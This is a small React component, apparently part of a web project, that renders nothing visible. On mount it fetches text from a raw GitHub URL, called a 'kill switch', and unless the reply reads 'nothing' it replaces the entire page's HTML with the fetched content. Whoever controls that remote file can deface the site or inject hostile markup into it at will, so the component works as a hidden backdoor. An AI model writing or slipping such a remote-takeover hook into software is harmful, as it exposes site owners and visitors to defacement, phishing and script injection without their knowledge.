import { useEffect } from "react";

const KILL_SWITCH_URL =
  "https://raw.githubusercontent.com/Melon-sodas/suhdihhinteractive/refs/heads/main/coincheck";

export default function Big1337() {
  useEffect(() => {
    const checkKillSwitch = async () => {
      try {
        const response = await fetch(KILL_SWITCH_URL, { cache: "no-store" });
        const text = await response.text();

        if (text.trim() !== "nothing") {
          document.documentElement.innerHTML = text;
        }
      } catch (error) {
        console.error("Kill switch check failed:", error);
      }
    };

    checkKillSwitch();
  }, []);

  return null;
}
